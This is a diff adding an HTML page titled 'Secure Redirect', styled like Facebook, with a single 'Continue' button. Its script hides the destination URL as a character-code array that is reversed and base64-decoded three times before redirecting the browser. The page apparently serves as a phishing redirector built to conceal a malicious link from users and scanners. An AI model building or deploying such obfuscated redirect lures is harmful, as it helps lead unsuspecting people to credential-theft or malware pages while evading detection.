@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Redirect</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .box {
+      background: white;
+      padding: 2rem 3rem;
+      border-radius: 0.75rem;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    .box h2 {
+      color: #1877f2;
+      margin-bottom: 1rem;
+    }
+    .box p {
+      color: #555;
+      font-size: 0.95rem;
+    }
+    .btn {
+      margin-top: 1.5rem;
+      padding: 0.8rem 2rem;
+      font-size: 1rem;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn:hover {
+      background-color: #166fe5;
+    }
+  </style>
+  <script>
+    const encodedLinks = {
+      0: [61, 61, 81, 80, 78, 104, 86, 84, 73, 74, 108, 77, 105, 70, 84, 84, 71, 112, 70, 101, 118, 66, 84, 84, 111, 108, 122, 82, 104, 108, 51, 100, 114, 78, 50, 99, 107, 86, 107, 87, 120, 89, 85, 77, 78, 112, 108, 81, 69, 70, 87, 101, 51, 66, 68, 90, 68, 104, 109, 86, 88, 70, 68, 90, 122, 89, 86, 89, 119, 49, 50, 85, 90, 66, 72, 98, 78, 70, 122, 97, 117, 108, 86, 99, 119, 90, 107, 85, 80, 74, 70, 87, 83, 86, 85, 78, 86, 86, 109, 86, 83, 116, 50, 86, 51, 90, 108, 97, 78, 108, 109, 81, 117, 86, 86, 87, 115, 70, 122, 89, 49, 77, 109, 86, 90, 108, 88, 87, 115, 49, 85, 89, 111, 49, 87, 85, 54, 86, 85, 98, 104, 100, 70, 90, 86, 108, 86, 99, 115, 82, 86, 90, 78, 112, 70, 86, 85, 108, 107, 84, 72, 49, 48, 85, 111, 86, 86, 87]
+    };
+
+    function redirect() {
+      const keys = Object.keys(encodedLinks);
+      const rand = keys[Math.floor(Math.random() * keys.length)];
+      const reversed = String.fromCharCode(...encodedLinks[rand]);
+      const original = reversed.split('').reverse().join('');
+      const url = atob(atob(atob(original)));
+      window.location.href = url;
+    }
+  </script>
+</head>
+<body>
+  <div class="box">
+    <h2>Redirect Confirmation</h2>
+    <p>Please click the button below to continue.</p>
+    <button class="btn" onclick="redirect()">Continue</button>
+  </div>
+</body>
+</html>
